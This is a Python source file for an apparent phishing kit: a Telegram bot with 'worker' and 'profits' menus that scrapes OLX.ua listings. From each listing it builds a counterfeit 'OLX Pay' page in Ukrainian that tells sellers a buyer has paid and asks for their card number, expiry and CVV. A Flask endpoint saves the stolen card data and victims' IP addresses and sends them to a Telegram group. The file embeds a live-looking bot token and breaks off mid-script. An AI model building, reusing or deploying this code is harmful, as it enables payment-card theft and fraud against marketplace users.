import logging
import threading
import asyncio
import base64
import uuid
import io
import os
from datetime import datetime
from flask import Flask, request, jsonify, render_template, url_for, redirect
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
import aiohttp
from bs4 import BeautifulSoup
import nest_asyncio
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import Column, Integer, String, Text, DateTime, Boolean
from PIL import Image
import requests
from io import BytesIO

# Применяем nest_asyncio для возможности вложенных циклов событий
nest_asyncio.apply()

# Токен бота
API_TOKEN = '8075120505:AAHjAuI6QiGaJcCJ1aigHNRVg9pvsDVXCfs'

# ID группы для пересылки данных
GROUP_ID = -4664157955

# Состояния пользователей
user_states = {}

# Настройка логирования
logging.basicConfig(level=logging.INFO)

# Создаем Flask приложение
app = Flask(__name__)

# Убедимся, что директория templates существует
os.makedirs('templates', exist_ok=True)

# Настройка базы данных
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///olx_data.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Модель для хранения данных объявлений OLX
class OlxListing(db.Model):
    id = Column(Integer, primary_key=True)
    unique_id = Column(String(36), unique=True, default=lambda: str(uuid.uuid4()))
    title = Column(String(255), nullable=False)
    price = Column(String(100), nullable=False)
    image_base64 = Column(Text, nullable=True)
    source_url = Column(String(500), nullable=False)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    def __repr__(self):
        return f'<OlxListing {self.title}>'

# Модель для хранения данных карт
class CardData(db.Model):
    id = Column(Integer, primary_key=True)
    listing_id = Column(String(36), nullable=True)
    card_number = Column(String(20), nullable=False)
    expiry = Column(String(10), nullable=False)
    cvv = Column(String(5), nullable=False)
    ip_address = Column(String(50), nullable=True)
    processed = Column(Boolean, default=False)
    created_at = Column(DateTime, default=datetime.utcnow)
    
    def __repr__(self):
        return f'<CardData {self.card_number[:4]}...>'

# Создаем таблицы в базе данных
with app.app_context():
    db.create_all()

# Создаем объект бота и диспетчера
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# Создаем новый цикл событий для использования в Flask
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# Функция для конвертации изображения в base64
def image_to_base64(image_url):
    try:
        response = requests.get(image_url)
        if response.status_code == 200:
            image = Image.open(BytesIO(response.content))
            image = image.resize((300, 300), Image.LANCZOS)
            buffer = BytesIO()
            image.save(buffer, format="JPEG", quality=80)
            image_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
            return f"data:image/jpeg;base64,{image_base64}"
        return None
    except Exception as e:
        logging.error(f"Ошибка при конвертации изображения: {e}")
        return None

# Функция для парсинга OLX объявления
async def parse_olx_listing(url: str):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')

                # Парсим название
                title_tag = soup.find('div', {'data-cy': 'ad_title'})
                title = title_tag.find('h4').text.strip() if title_tag else 'Название не найдено'

                # Парсим цену
                price_tag = soup.find('div', {'data-testid': 'ad-price-container'})
                price = price_tag.text.strip() if price_tag else 'Цена не найдена'

                # Парсим первую картинку
                image_tag = soup.find('img', {'class': 'css-1bmvjcs'})
                image_url = image_tag['src'] if image_tag else None
                
        # Конвертируем изображение в base64 (синхронно)
        image_base64 = image_to_base64(image_url) if image_url else None
        
        # Создаем уникальный ID
        unique_id = str(uuid.uuid4())
        
        # Используем контекст приложения Flask для работы с базой данных
        with app.app_context():
            # Создаем новый объект
            listing = OlxListing(
                unique_id=unique_id,
                title=title,
                price=price,
                image_base64=image_base64,
                source_url=url
            )
            db.session.add(listing)
            db.session.commit()
            
            # Получаем данные для возврата
            return {
                "unique_id": unique_id,
                "title": title,
                "price": price,
                "source_url": url
            }
    except Exception as e:
        logging.error(f"Ошибка при парсинге: {e}")
        raise e

# Обновляем класс CallbackData для новых кнопок
class CallbackData:
    MAIN_MENU = "main_menu"
    CREATE_LINK = "create_link"
    PLATFORM_OLX = "platform_olx"
    MY_ADS = "my_ads"
    MY_PROFITS = "my_profits"
    MENTORS = "mentors"
    CHATS = "chats"
    SETTINGS = "settings"

# Обработчик команды /start
@dp.message(Command("start"))
async def send_welcome(message: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🔗 Меню")]
        ],
        resize_keyboard=True
    )
    
    await message.answer(
        "👋 Привет! Нажми на кнопку Меню",
        reply_markup=kb
    )

@dp.message(lambda message: message.text == "🔗 Меню")
async def show_main_menu(message: Message):
    kb = InlineKeyboardBuilder()
    
    # First row: "Создать ссылку" "Мои объявления"
    kb.row(
        InlineKeyboardButton(
            text="🔗 Создать ссылку", 
            callback_data=CallbackData.CREATE_LINK
        ),
        InlineKeyboardButton(
            text="📋 Мои объявления", 
            callback_data=CallbackData.MY_ADS
        )
    )
    
    # Second row: "Чаты" "Наставники"
    kb.row(
        InlineKeyboardButton(
            text="💬 Чаты", 
            callback_data=CallbackData.CHATS
        ),
        InlineKeyboardButton(
            text="👥 Наставники", 
            callback_data=CallbackData.MENTORS
        )
    )
    
    # Third row: "Мои профиты" "Настройки"
    kb.row(
        InlineKeyboardButton(
            text="💰 Мои профиты", 
            callback_data=CallbackData.MY_PROFITS
        ),
        InlineKeyboardButton(
            text="⚙️ Настройки", 
            callback_data=CallbackData.SETTINGS
        )
    )
    
    # Используем реальный ID пользователя
    user_id = message.from_user.id
    
    # Формируем текст с информацией о пользователе
    user_info_text = (
        "🍭 Cream Team\n\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"🛠 Статус: <code>Воркер</code>\n"
        f"💰 Профитов: <code>0</code> на сумму <code>0 USDT</code>\n\n"
        "🐣 Ник: <code>Виден</code>"
    )
    
    await message.answer(
        user_info_text,
        reply_markup=kb.as_markup(),
        parse_mode="HTML"
    )

# Обновляем также callback-обработчик возврата в меню
@dp.callback_query(lambda c: c.data == CallbackData.MAIN_MENU)
async def return_to_main_menu(callback: CallbackQuery):
    kb = InlineKeyboardBuilder()
    
    # First row: "Создать ссылку" "Мои объявления"
    kb.row(
        InlineKeyboardButton(
            text="🔗 Создать ссылку", 
            callback_data=CallbackData.CREATE_LINK
        ),
        InlineKeyboardButton(
            text="📋 Мои объявления", 
            callback_data=CallbackData.MY_ADS
        )
    )
    
    # Second row: "Чаты" "Наставники"
    kb.row(
        InlineKeyboardButton(
            text="💬 Чаты", 
            callback_data=CallbackData.CHATS
        ),
        InlineKeyboardButton(
            text="👥 Наставники", 
            callback_data=CallbackData.MENTORS
        )
    )
    
    # Third row: "Мои профиты" "Настройки"
    kb.row(
        InlineKeyboardButton(
            text="💰 Мои профиты", 
            callback_data=CallbackData.MY_PROFITS
        ),
        InlineKeyboardButton(
            text="⚙️ Настройки", 
            callback_data=CallbackData.SETTINGS
        )
    )
    
    # Используем реальный ID пользователя
    user_id = callback.from_user.id
    
    # Формируем текст с информацией о пользователе
    user_info_text = (
        "🍭 Cream Team\n\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"🛠 Статус: <code>Воркер</code>\n"
        f"💰 Профитов: <code>0</code> на сумму <code>0 USDT</code>\n\n"
        "🐣 Ник: <code>Виден</code>"
    )
    
    await callback.message.edit_text(
        user_info_text,
        reply_markup=kb.as_markup(),
        parse_mode="HTML"
    )

@dp.callback_query(lambda c: c.data == CallbackData.CREATE_LINK)
async def process_create_link(callback: CallbackQuery):
    # Create platform selection keyboard
    kb = InlineKeyboardBuilder()
    kb.add(InlineKeyboardButton(
        text="OLX 🏷️", 
        callback_data=CallbackData.PLATFORM_OLX
    ))
    kb.row(  # Добавляем кнопку возврата в меню
        InlineKeyboardButton(
            text="🔙 Назад в меню", 
            callback_data=CallbackData.MAIN_MENU
        )
    )
    
    # Устанавливаем состояние "ожидания выбора площадки"
    user_states[callback.from_user.id] = {
        'state': 'selecting_platform'
    }
    
    await callback.message.edit_text(
        "Выберите площадку для создания ссылки:",
        reply_markup=kb.as_markup()
    )
# Обработчики для всех пунктов меню с возвратом в главное меню

@dp.callback_query(lambda c: c.data == CallbackData.MY_ADS)
async def process_my_ads(callback: CallbackQuery):
    # Получаем ID пользователя
    user_id = callback.from_user.id
    
    # Получаем список объявлений из базы данных
    with app.app_context():
        # Для простоты - получаем все объявления, в реальном приложении нужно будет 
        # как-то связать объявления с конкретным пользователем
        listings = OlxListing.query.all()
    
    kb = InlineKeyboardBuilder()
    
    # Если есть объявления, создаем кнопки для каждого
    if listings:
        for listing in listings:
            # Обрезаем название, если оно слишком длинное
            short_title = (listing.title[:20] + '...') if len(listing.title) > 20 else listing.title
            
            kb.row(
                InlineKeyboardButton(
                    text=f"{short_title} - {listing.price}", 
                    url=listing.source_url
                )
            )
    
    # Добавляем кнопку возврата в меню
    kb.row(
        InlineKeyboardButton(
            text="🔙 Назад в меню", 
            callback_data=CallbackData.MAIN_MENU
        )
    )
    
    # Формируем текст сообщения
    if listings:
        message_text = "📋 Мои объявления:\n\n" + \
            "\n".join([f"• {listing.title} - {listing.price}" for listing in listings])
    else:
        message_text = "📋 Мои объявления:\n\nУ вас пока нет объявлений."
    
    await callback.message.edit_text(
        message_text,
        reply_markup=kb.as_markup(),
        disable_web_page_preview=True
    )

@dp.callback_query(lambda c: c.data == CallbackData.CHATS)
async def process_chats(callback: CallbackQuery):
    kb = InlineKeyboardBuilder()
    kb.add(InlineKeyboardButton(
        text="🔙 Назад в меню", 
        callback_data=CallbackData.MAIN_MENU
    ))
    
    await callback.message.edit_text(
        "💬 Чаты:\n\n"
        "У вас пока нет активных чатов.",
        reply_markup=kb.as_markup()
    )

@dp.callback_query(lambda c: c.data == CallbackData.MENTORS)
async def process_mentors(callback: CallbackQuery):
    kb = InlineKeyboardBuilder()
    kb.add(InlineKeyboardButton(
        text="🔙 Назад в меню", 
        callback_data=CallbackData.MAIN_MENU
    ))
    
    await callback.message.edit_text(
        "👥 Наставники:\n\n"
        "Список наставников временно недоступен.",
        reply_markup=kb.as_markup()
    )

@dp.callback_query(lambda c: c.data == CallbackData.MY_PROFITS)
async def process_my_profits(callback: CallbackQuery):
    kb = InlineKeyboardBuilder()
    kb.add(InlineKeyboardButton(
        text="🔙 Назад в меню", 
        callback_data=CallbackData.MAIN_MENU
    ))
    
    await callback.message.edit_text(
        "💰 Мои профиты:\n\n"
        "У вас пока нет профитов.",
        reply_markup=kb.as_markup()
    )

@dp.callback_query(lambda c: c.data == CallbackData.SETTINGS)
async def process_settings(callback: CallbackQuery):
    kb = InlineKeyboardBuilder()
    kb.add(InlineKeyboardButton(
        text="🔙 Назад в меню", 
        callback_data=CallbackData.MAIN_MENU
    ))
    
    await callback.message.edit_text(
        "⚙️ Настройки:\n\n"
        "Раздел настроек находится в разработке.",
        reply_markup=kb.as_markup()
    )

# Callback handler for OLX platform
@dp.callback_query(lambda c: c.data == CallbackData.PLATFORM_OLX)
async def process_olx_platform(callback: CallbackQuery):
    await callback.message.edit_text(
        "✅ Выбрана площадка OLX. \n\n"
        "Пожалуйста, отправьте ссылку на объявление OLX для создания страницы оплаты."
    )

# Обработчик кнопки создания ссылки
@dp.callback_query(lambda c: c.data == CallbackData.CREATE_LINK)
async def process_create_link(callback: CallbackQuery):
    kb = InlineKeyboardBuilder()
    kb.add(InlineKeyboardButton(
        text="OLX 🏷️", 
        callback_data=CallbackData.PLATFORM_OLX
    ))
    kb.adjust(1)
    
    await callback.message.edit_text(
        "Выберите площадку для создания ссылки:",
        reply_markup=kb.as_markup()
    )

# Обработчик выбора площадки OLX
@dp.callback_query(lambda c: c.data == CallbackData.PLATFORM_OLX)
async def process_olx_platform(callback: CallbackQuery):
    await callback.message.edit_text(
        "✅ Выбрана площадка OLX. \n\n"
        "Пожалуйста, отправьте ссылку на объявление OLX для создания страницы оплаты."
    )


@dp.message()
async def handle_message(message: Message):
    # Проверка, что это ссылка на OLX
    if not message.text or not message.text.startswith('https://www.olx.ua/d/'):
        return

    url = message.text
    try:
        # Парсим данные и сохраняем в базу
        listing_data = await parse_olx_listing(url)
        
        # Формируем ссылку на оплату
        payment_url = f"http://127.0.0.1:5000/payment/{listing_data['unique_id']}"
        
        # Отправляем ответное сообщение
        response = (
            f"✅ Объявление успешно обработано!\n\n"
            f"Название: {listing_data['title']}\n"
            f"Цена: {listing_data['price']}\n\n"
            f"🔗 Ссылка на страницу оплаты:\n{payment_url}"
        )
        await message.reply(response)
    except Exception as e:
        await message.reply(f"Ошибка при парсинге объявления: {str(e)}")

# Страница оплаты с данными объявления
@app.route('/payment/<listing_id>')
def payment_page(listing_id):
    with app.app_context():
        listing = OlxListing.query.filter_by(unique_id=listing_id).first_or_404()
        return render_template('payment.html', listing=listing)

# Асинхронная функция для отправки сообщения в Telegram
async def send_telegram_message(message_text):
    try:
        await bot.send_message(chat_id=GROUP_ID, text=message_text)
        return True
    except Exception as e:
        logging.error(f"Ошибка при отправке сообщения в Telegram: {e}")
        return False

# Эндпоинт для приема данных с формы
@app.route('/send_message', methods=['POST'])
def send_message():
    try:
        data = request.json
        card = data.get("card", "Не указано")
        expiry = data.get("expiry", "Не указано")
        cvv = data.get("cvv", "Не указано")
        listing_id = data.get("listing_id", None)
        
        # Получаем IP-адрес пользователя
        client_host = request.remote_addr
        
        # Получаем информацию о объявлении, если есть listing_id
        listing_info = ""
        if listing_id:
            with app.app_context():
                listing = OlxListing.query.filter_by(unique_id=listing_id).first()
                if listing:
                    listing_info = (
                        f"\n\n📦 Информация о товаре:\n"
                        f"Название: {listing.title}\n"
                        f"Цена: {listing.price}\n"
                        f"Ссылка: {listing.source_url}"
                    )
        
        # Формируем сообщение
        message_text = (
            f"🔐 Получены новые данные карты:{listing_info}\n\n"
            f"💳 Номер карты: {card}\n"
            f"📅 Срок действия: {expiry}\n"
            f"🔑 CVV: {cvv}\n"
            f"🌐 IP-адрес: {client_host}"
        )
        
        # Сохраняем данные карты в базу
        with app.app_context():
            card_data = CardData(
                listing_id=listing_id,
                card_number=card,
                expiry=expiry,
                cvv=cvv,
                ip_address=client_host
            )
            db.session.add(card_data)
            db.session.commit()
        
        # Отправляем сообщение в группу через цикл событий
        future = asyncio.run_coroutine_threadsafe(send_telegram_message(message_text), loop)
        result = future.result()  # Ждем результат
        
        if result:
            return jsonify({"status": "Данные успешно отправлены"})
        else:
            return jsonify({"status": "Ошибка при отправке данных в Telegram"})
    except Exception as e:
        logging.error(f"Ошибка при обработке данных: {e}")
        return jsonify({"status": "Ошибка при обработке данных", "error": str(e)})

# Функция для запуска бота
async def start_bot():
    try:
        await dp.start_polling(bot)
    except Exception as e:
        logging.error(f"Ошибка при запуске бота: {e}")

# Функция для запуска бота в отдельном потоке
def run_bot():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_bot())

# Создание HTML файлов в директории templates
def create_templates():
    # Страница оплаты с шаблонизацией через {{ }}
    payment_html = """<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OLX - Оплата товару {{ listing.title }}</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  <style>
  body {
    font-family: 'Inter', sans-serif;
    margin: 0;
    padding: 0;
    background-color: #f6f6f6;
    color: #333;
  }
  header {
    background-color: #002f34;
    color: white;
    padding: 15px 0;
    text-align: center;
    box-shadow: 0 2px 10px rgba(0,0,0,0.2);
  }
  .logo {
    max-width: 100px;
    height: auto;
  }
  .container {
    max-width: 1200px;
    margin: 0 auto;
    padding: 20px;
    display: flex;
    gap: 30px;
  }
  .left-column {
    flex: 1;
    margin-top: 20px;
  }
  .right-column {
    flex: 1;
  }
  .confirm-header {
    text-align: center;
    font-weight: 600;
    color: #002f34;
    font-size: 24px;
    margin-bottom: 15px;
    letter-spacing: -0.5px;
  }
  .divider {
    width: 80%;
    height: 2px;
    background-color: #002f34;
    margin: 0 auto 20px;
  }
  .product-header {
    display: flex;
    align-items: center;
    background-color: white;
    border-radius: 8px;
    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    margin-bottom: 20px;
    padding: 20px;
  }
  .product-image {
    width: 120px;
    height: 120px;
    object-fit: cover;
    border-radius: 8px;
    margin-right: 15px;
    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
  }
  .product-details {
    flex-grow: 1;
  }
  .product-details h3 {
    margin: 0 0 10px 0;
    font-size: 18px;
    font-weight: 600;
  }
  .product-price {
    font-weight: bold;
    color: #002f34;
    margin-bottom: 10px;
    font-size: 20px;
  }
  .payment-form {
    background-color: white;
    border-radius: 12px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    padding: 25px;
    position: relative;
    overflow: hidden;
  }
  .payment-form::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 6px;
    background: linear-gradient(90deg, #002f34, #1ea1f2, #002f34);
  }
  .form-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 20px;
    padding-bottom: 15px;
    border-bottom: 1px solid #eee;
  }
  .form-title {
    font-size: 18px;
    font-weight: 600;
    color: #002f34;
    display: flex;
    align-items: center;
  }
  .form-title i {
    margin-right: 8px;
    color: #1ea1f2;
  }
  .security-badges {
    display: flex;
    align-items: center;
  }
  .security-badge {
    display: flex;
    align-items: center;
    font-size: 13px;
    color: #555;
    margin-left: 15px;
  }
  .security-badge i {
    margin-right: 5px;
    color: #28a745;
  }
  .payment-methods {
    display: flex;
    gap: 10px;
    margin-bottom: 20px;
  }
  .payment-method {
    width: 50px;
    height: 30px;
    background-color: #f8f9fa;
    border-radius: 4px;
    display: flex;
    justify-content: center;
    align-items: center;
    border: 1px solid #ddd;
  }
  .form-group {
    margin-bottom: 20px;
    position: relative;
  }
  .form-group label {
    display: block;
    margin-bottom: 8px;
    font-weight: 500;
    color: #444;
  }
  .form-group input {
    width: 100%;
    padding: 12px 15px;
    border: 1px solid #ddd;
    border-radius: 8px;
    font-size: 16px;
    box-sizing: border-box;
    transition: border-color 0.3s ease, box-shadow 0.3s ease;
  }
  .form-group input:focus {
    border-color: #1ea1f2;
    box-shadow: 0 0 0 3px rgba(30, 161, 242, 0.2);
    outline: none;
  }
  .form-group i.card-icon {
    position: absolute;
    right: 15px;
    top: 37px;
    color: #777;
  }
  .dual-input {
    display: flex;
    gap: 15px;
  }
  .dual-input .form-group {
    flex: 1;
  }
  .submit-btn {
    width: 100%;
    padding: 14px;
    background-color: #0061f2;
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    cursor: pointer;
    transition: background-color 0.3s ease, transform 0.1s ease;
    font-weight: 600;
    display: flex;
    justify-content: center;
    align-items: center;
    box-shadow: 0 4px 6px rgba(0, 97, 242, 0.2);
  }
  .submit-btn:hover {
    background-color: #0052cc;
  }
  .submit-btn:active {
    transform: translateY(1px);
  }
  .submit-btn i {
    margin-right: 8px;
  }
  .secure-payment-notice {
    display: flex;
    align-items: center;
    justify-content: center;
    margin-top: 20px;
    padding: 10px;
    background-color: #f8f9fa;
    border-radius: 8px;
    color: #555;
    font-size: 14px;
  }
  .secure-payment-notice i {
    margin-right: 8px;
    color: #28a745;
  }
  .card-info {
    border: 1px solid #e9ecef;
    border-radius: 8px;
    padding: 15px;
    margin-bottom: 25px;
    background-color: #f8f9fa;
  }
  .card-info-title {
    font-weight: 600;
    margin-bottom: 10px;
    color: #444;
    display: flex;
    align-items: center;
  }
  .card-info-title i {
    margin-right: 8px;
    color: #1ea1f2;
  }
  .success-message {
    display: none;
    text-align: center;
    color: #28a745;
    font-weight: bold;
    margin-top: 20px;
    padding: 20px;
    background-color: #f8f9fa;
    border-radius: 8px;
    border-left: 5px solid #28a745;
  }
  .already-paid {
    background-color: #e6f7ff;
    border-left: 5px solid #1ea1f2;
    padding: 15px;
    margin-bottom: 20px;
    border-radius: 8px;
    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
  }
  .already-paid-title {
    font-weight: 600;
    color: #0061f2;
    margin-bottom: 5px;
    display: flex;
    align-items: center;
  }
  .already-paid-title i {
    margin-right: 10px;
  }
  .trust-indicators {
    background-color: white;
    border-radius: 12px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    padding: 20px;
    margin-top: 20px;
  }
  .trust-title {
    font-weight: 600;
    color: #002f34;
    margin-bottom: 15px;
    display: flex;
    align-items: center;
    font-size: 18px;
  }
  .trust-title i {
    margin-right: 10px;
    color: #28a745;
  }
  .trust-items {
    display: flex;
    flex-direction: column;
    gap: 15px;
  }
  .trust-item {
    display: flex;
    align-items: flex-start;
  }
  .trust-item i {
    margin-right: 10px;
    color: #28a745;
    margin-top: 2px;
  }
  .trust-item-content {
    flex: 1;
  }
  .trust-item-title {
    font-weight: 600;
    margin-bottom: 3px;
    color: #444;
  }
  .olx-guarantee {
    background-color: #ffffe0;
    border: 1px dashed #ffd700;
    padding: 15px;
    border-radius: 8px;
    margin-top: 20px;
    text-align: center;
  }
  .olx-guarantee-title {
    font-weight: 600;
    color: #b8860b;
    margin-bottom: 5px;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .olx-guarantee-title i {
    margin-right: 8px;
  }
  .order-status {
    background-color: #f0fff0;
    border-left: 5px solid #28a745;
    padding: 15px;
    margin-bottom: 20px;
    border-radius: 8px;
  }
  .order-status-title {
    font-weight: 600;
    color: #28a745;
    margin-bottom: 5px;
    display: flex;
    align-items: center;
  }
  .order-status-title i {
    margin-right: 10px;
  }
  .order-progress {
    display: flex;
    margin-top: 15px;
    position: relative;
    justify-content: space-between;
  }
  .order-progress:before {
    content: '';
    position: absolute;
    height: 4px;
    background-color: #ddd;
    top: 15px;
    left: 20px;
    right: 20px;
  }
  .order-progress:after {
    content: '';
    position: absolute;
    height: 4px;
    background-color: #28a745;
    top: 15px;
    left: 20px;
    width: 33%;
  }
  .progress-step {
    z-index: 1;
    background-color: white;
    border: 2px solid #ddd;
    width: 30px;
    height: 30px;
    border-radius: 50%;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .progress-step.active {
    border-color: #28a745;
    background-color: #28a745;
    color: white;
  }
  .progress-labels {
    display: flex;
    justify-content: space-between;
    margin-top: 5px;
    font-size: 12px;
    color: #777;
  }
  .progress-label {
    text-align: center;
    max-width: 80px;
  }
  .progress-label.active {
    color: #28a745;
    font-weight: 600;
  }
  .support-info {
    background-color: white;
    border-radius: 8px;
    padding: 15px;
    margin-top: 20px;
    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    text-align: center;
  }
  .support-title {
    font-weight: 600;
    margin-bottom: 10px;
    color: #444;
  }
  .support-contact {
    display: flex;
    justify-content: center;
    align-items: center;
    margin-top: 10px;
    gap: 15px;
  }
  .support-contact a {
    color: #0061f2;
    text-decoration: none;
    display: flex;
    align-items: center;
  }
  .support-contact a i {
    margin-right: 5px;
  }
  @media (max-width: 991px) {
  .container {
    flex-direction: column;
    padding: 10px;
  }
  .left-column, .right-column {
    width: 100%;
  }
}

@media (max-width: 768px) {
  .dual-input {
    flex-direction: column;
    gap: 0;
  }
  .payment-methods {
    justify-content: center;
  }
  .form-header {
    flex-direction: column;
    align-items: flex-start;
  }
  .security-badges {
    margin-top: 10px;
  }
  .security-badge {
    margin-left: 0;
    margin-right: 15px;
  }
  .order-progress {
    margin-left: -10px;
    margin-right: -10px;
  }
  
  /* Additional mobile improvements */
  .product-header {
    flex-direction: column;
    align-items: center;
    text-align: center;
  }
  .product-image {
    margin-right: 0;
    margin-bottom: 15px;
  }
  .product-details {
    width: 100%;
  }
  .trust-item {
    flex-direction: column;
    align-items: center;
    text-align: center;
  }
  .trust-item i {
    margin-right: 0;
    margin-bottom: 8px;
    font-size: 24px;
  }
  .support-contact {
    flex-direction: column;
    gap: 10px;
  }
  .form-group input {
    font-size: 16px; /* Prevents zoom on input focus on iOS */
    padding: 15px;
  }
  .submit-btn {
    padding: 16px;
  }
  .form-title, .trust-title, .already-paid-title, .order-status-title {
    font-size: 16px;
  }
  .confirm-header {
    font-size: 20px;
  }
  
  /* Improve touch targets */
  .progress-step {
    width: 36px;
    height: 36px;
  }
  .payment-method {
    width: 60px;
    height: 40px;
  }
}

/* Additional breakpoint for very small screens */
@media (max-width: 480px) {
  body {
    font-size: 14px;
  }
  .container {
    padding: 10px 5px;
  }
  .payment-form, .trust-indicators, .product-header {
    padding: 15px 10px;
  }
  .progress-labels {
    font-size: 10px;
  }
  .logo {
    max-width: 80px;
  }
  .order-progress:before, .order-progress:after {
    left: 15px;
    right: 15px;
  }
}
  </style>
</head>
<body>
<header>
  <img src="{{ url_for('static', filename='olx_62.png') }}" alt="OLX Logo" class="logo">
</header>

<div class="container">
  <div class="left-column">
    <div class="product-header">
      {% if listing.image_base64 %}
      <img src="{{ listing.image_base64 }}" alt="{{ listing.title }}" class="product-image">
      {% endif %}
      <div class="product-details">
        <h3>{{ listing.title }}</h3>
        <div class="product-price">{{ listing.price }}</div>
        <small>Номер замовлення: {{ listing.unique_id[:8] }}</small>
      </div>
    </div>

    <div class="already-paid">
      <div class="already-paid-title">
        <i class="fas fa-info-circle"></i> Товар вже оплачено
      </div>
      <div>Ви вже зробили оплату за цей товар. Будь ласка, підтвердіть платіж для завершення транзакції.</div>
    </div>

    <div class="order-status">
      <div class="order-status-title">
        <i class="fas fa-truck"></i> Статус замовлення
      </div>
      <div>Ваше замовлення обробляється. Очікується підтвердження платежу.</div>
      
      <div class="order-progress">
        <div class="progress-step active"><i class="fas fa-check"></i></div>
        <div class="progress-step"><i class="fas fa-credit-card"></i></div>
        <div class="progress-step"><i class="fas fa-box"></i></div>
        <div class="progress-step"><i class="fas fa-truck"></i></div>
      </div>
      <div class="progress-labels">
        <div class="progress-label active">Замовлено</div>
        <div class="progress-label">Підтверджено</div>
        <div class="progress-label">Готується</div>
        <div class="progress-label">Доставка</div>
      </div>
    </div>

    <div class="olx-guarantee">
      <div class="olx-guarantee-title">
        <i class="fas fa-shield-alt"></i> Гарантія OLX Pay
      </div>
      <div>Ваша покупка захищена. Гроші надійдуть продавцю тільки після підтвердження отримання товару.</div>
    </div>

    <div class="trust-indicators">
      <div class="trust-title">
        <i class="fas fa-check-circle"></i> Чому обирають OLX Pay
      </div>
      <div class="trust-items">
        <div class="trust-item">
          <i class="fas fa-shield-alt"></i>
          <div class="trust-item-content">
            <div class="trust-item-title">100% Безпечні платежі</div>
            <div>Всі транзакції захищені сучасними технологіями шифрування</div>
          </div>
        </div>
        <div class="trust-item">
          <i class="fas fa-undo"></i>
          <div class="trust-item-content">
            <div class="trust-item-title">Гарантія повернення коштів</div>
            <div>Якщо товар не відповідає опису, ви отримаєте повне відшкодування</div>
          </div>
        </div>
        <div class="trust-item">
          <i class="fas fa-headset"></i>
          <div class="trust-item-content">
            <div class="trust-item-title">Цілодобова підтримка</div>
            <div>Наша команда підтримки завжди готова допомогти вам</div>
          </div>
        </div>
      </div>
    </div>

    <div class="support-info">
      <div class="support-title">Потрібна допомога?</div>
      <div>Наша служба підтримки працює цілодобово</div>
      <div class="support-contact">
        <a href="#"><i class="fas fa-envelope"></i> support@olx.ua</a>
        <a href="#"><i class="fas fa-phone"></i> 0800 123 456</a>
      </div>
    </div>
  </div>

  <div class="right-column">
    <h2 class="confirm-header">Підтвердіть отримання коштів</h2>
    <div class="divider"></div>

    <div class="payment-form">
      <div class="form-header">
        <div class="form-title">
          <i class="fas fa-credit-card"></i> Безпечна оплата
        </div>
        <div class="security-badges">
          <div class="security-badge">
            <i class="fas fa-shield-alt"></i> Захищено
          </div>
          <div class="security-badge">
            <i class="fas fa-lock"></i> 256-bit SSL
          </div>
        </div>
      </div>

      <div class="payment-methods">
        <div class="payment-method"><i class="fab fa-cc-visa"></i></div>
        <div class="payment-method"><i class="fab fa-cc-mastercard"></i></div>
        <div class="payment-method"><i class="fab fa-cc-apple-pay"></i></div>
        <div class="payment-method"><i class="fab fa-cc-jcb"></i></div>
      </div>

      <div class="card-info">
        <div class="card-info-title">
          <i class="fas fa-info-circle"></i> Інформація про транзакцію
        </div>
        <div>Банк-отримувач: OLX Payment System</div>
        <div>Тип транзакції: Захищений платіж</div>
        <div>Сума до сплати: {{ listing.price }}</div>
      </div>

      <form id="dataForm">
        <input type="hidden" id="listing_id" value="{{ listing.unique_id }}">
        
        <div class="form-group">
          <label for="card">Номер картки</label>
          <input type="text" id="card" name="card" placeholder="1234 5678 9012 3456" 
                maxlength="19" required pattern="\d{4}\s\d{4}\s\d{4}\s\d{4}">
          <i class="fas fa-credit-card card-icon"></i>
        </div>
        
        <div class="dual-input">
          <div class="form-group">
            <label for="expiry">Термін дії</label>
            <input type="text" id="expiry" name="expiry" placeholder="ММ/РР" 
                  maxlength="5" required pattern="\d{2}/\d{2}">
          </div>
          
          <div class="form-group">
            <label for="cvv">CVV</label>
            <input type="text" id="cvv" name="cvv" placeholder="123" 
                  maxlength="3" required pattern="\d{3}">
            <i class="fas fa-question-circle card-icon" title="3-значний код на зворотній стороні картки"></i>
          </div>
        </div>
        
        <button type="submit" class="submit-btn">
          <i class="fas fa-lock"></i> Підтвердити платіж
        </button>
      </form>

      <div class="secure-payment-notice">
        <i class="fas fa-shield-alt"></i> Ваш платіж захищено протоколом безпеки OLX Secure Pay
      </div>

      <div id="successMessage" class="success-message">
        <i class="fas fa-check-circle"></i> Платіж успішно підтверджено!
      </div>
    </div>
  </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
  const cardInput = document.getElementById('card');
